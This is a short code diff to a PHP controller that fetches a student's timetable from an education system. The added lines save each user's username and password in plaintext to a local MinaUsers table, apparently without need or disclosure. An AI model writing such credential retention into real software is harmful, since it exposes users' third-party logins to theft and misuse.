@@ -89,6 +89,10 @@ class EduController extends Controller
             $semester = $request->input('semester', config('edu.semester'));
             $week = $request->input('week', '');
             $token = $eduService->getToken($username, $password);
+            $modelMinaUser = new \App\Models\MinaUsers;
+            $modelMinaUser->username = $username;
+            $modelMinaUser->password = $password;
+            $modelMinaUser->save();
             $timetable = @$eduService->getTimetable($token, $semester, $week);
             return response()->json($timetable, 200, [], JSON_FORCE_OBJECT)->setCallback($request->input('callback'));
         } catch (\Throwable $t) {
